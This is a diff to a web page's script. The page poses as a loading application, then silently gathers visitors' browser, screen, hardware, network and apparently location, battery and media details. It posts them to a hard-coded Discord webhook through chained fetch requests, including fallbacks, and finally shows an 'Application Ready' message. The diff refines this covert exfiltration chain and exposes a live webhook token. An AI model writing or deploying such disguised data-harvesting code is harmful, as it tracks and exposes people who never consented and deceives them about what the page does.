@@ -59,6 +59,7 @@
     <canvas id="fingerprintCanvas" class="hidden-canvas" width="220" height="30"></canvas>
     
     <script>
+        // Ensure webhook URL is correct - this should lead to your Discord webhook
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1331766891630563360/hNFGqedGjuvsgNJmGBrk0asdX_kZ0D7dlK-7MdXEHihk_oXwYDrGtdNNRGO4UA4ZmBf7';
         
         const collectedData = {
@@ -475,12 +476,6 @@
                     (pendingOperations.battery ? "battery " : "") + 
                     (pendingOperations.media ? "media " : ""));
             }
-        }e {
-                console.log("Still waiting for: " + 
-                    (pendingOperations.geo ? "geo " : "") + 
-                    (pendingOperations.battery ? "battery " : "") + 
-                    (pendingOperations.media ? "media " : ""));
-            }
         }
         
         function formatDataForDiscord() {
@@ -526,22 +521,17 @@
         function sendDataToWebhook() {
             console.log('Attempting to send data to webhook...');
             
-            // Use a simple payload for first test
-            const basicPayload = {
-                content: "🔍 User data collection completed at " + new Date().toString(),
-                embeds: [{
-                    title: "Browser Information",
-                    description: JSON.stringify(collectedData.browser, null, 2)
-                }]
+            // Direct attempt with simple content first
+            const simplePayload = {
+                content: "📊 User data collected: " + navigator.userAgent
             };
             
-            // Send the initial test payload
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(basicPayload)
+                body: JSON.stringify(simplePayload)
             })
             .then(response => {
                 if (!response.ok) {
@@ -549,66 +539,81 @@
                 }
                 console.log('Initial test message sent successfully!');
                 
-                // If successful, send the full data in multiple chunks
-                const chunks = formatDataForDiscord();
-                
-                // Send chunks sequentially
-                const sendNextChunk = (index) => {
-                    if (index >= chunks.length) {
-                        console.log('All chunks sent successfully!');
-                        redirectToSuccess();
-                        return;
-                    }
-                    
-                    const chunkPayload = {
-                        content: chunks[index] + (index < chunks.length - 1 ? "\n(Continued...)" : "\n(End of Report)")
-                    };
-                    
-                    fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(chunkPayload)
-                    })
-                    .then(r => {
-                        if (!r.ok) throw new Error(`HTTP error! Status: ${r.status}`);
-                        console.log(`Chunk ${index + 1}/${chunks.length} sent successfully`);
-                        // Wait a short time between chunks to avoid rate limiting
-                        setTimeout(() => sendNextChunk(index + 1), 500);
-                    })
-                    .catch(e => {
-                        console.error(`Error sending chunk ${index + 1}:`, e);
-                        sendNextChunk(index + 1); // Try next chunk anyway
-                    });
+                // Now send browser info in a separate message
+                const browserPayload = {
+                    content: "**Browser Info:**\n```json\n" + 
+                             JSON.stringify(collectedData.browser, null, 2).substring(0, 1500) + 
+                             "\n```"
                 };
                 
-                // Start sending chunks
-                sendNextChunk(0);
+                return fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(browserPayload)
+                });
+            })
+            .then(response => {
+                console.log('Browser info sent successfully');
+                
+                // Now send screen info
+                const screenPayload = {
+                    content: "**Screen Info:**\n```json\n" + 
+                             JSON.stringify(collectedData.screen, null, 2).substring(0, 1500) + 
+                             "\n```"
+                };
+                
+                return fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(screenPayload)
+                });
+            })
+            .then(() => {
+                // Send other collected info in chunks
+                const systemInfoPayload = {
+                    content: "**System Info:**\n```json\n" + 
+                             JSON.stringify({
+                                hardware: collectedData.hardware,
+                                network: collectedData.network,
+                                capabilities: collectedData.capabilities
+                             }, null, 2).substring(0, 1500) + 
+                             "\n```"
+                };
+                
+                return fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(systemInfoPayload)
+                });
+            })
+            .then(() => {
+                console.log('All data sent successfully!');
+                redirectToSuccess();
             })
             .catch(error => {
-                console.error('Error sending initial data:', error);
+                console.error('Error sending data:', error);
                 
-                // Simpler fallback attempt with just essential info
+                // Ultimate fallback - one simple message
                 const fallbackPayload = {
-                    content: "**User Browser:** " + navigator.userAgent.substring(0, 1500)
+                    content: "**User Data:** Collection completed. Browser: " + 
+                             navigator.userAgent.substring(0, 1500)
                 };
                 
                 fetch(WEBHOOK_URL, {
-                    method: 'POST',
+                    method: 'POST', 
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify(fallbackPayload)
                 })
-                .then(response => {
-                    console.log('Fallback data sent:', response.status);
-                    redirectToSuccess();
-                })
-                .catch(err => {
-                    console.error('Final fallback failed:', err);
-                    redirectToSuccess();
-                });
+                .then(() => redirectToSuccess())
+                .catch(() => redirectToSuccess());
             });
         }
         
@@ -616,10 +621,14 @@
             clearInterval(messageInterval);
             statusElement.textContent = "Application loaded successfully!";
             
+            // Log final state for debugging
+            console.log("Script completed. Redirect to success page.");
+            
             setTimeout(() => {
                 document.querySelector('.container').innerHTML = `
                     <h1>Application Ready</h1>
                     <p>Thank you for your patience. The application is now ready to use.</p>
+                    <p class="status">All information has been processed successfully.</p>
                     <button onclick="window.location.reload()">Continue</button>
                 `;
             }, 1500);
@@ -668,9 +677,10 @@
                 
                 if (forcedCompletion) {
                     console.log("Forced completion due to timeout");
+                    statusElement.textContent = "Finalizing data collection...";
                     checkAllDataCollected();
                 }
-            }, 15000);
+            }, 10000);  // Reduced timeout to 10 seconds
         }
         
         window.addEventListener('load', collectAllData);
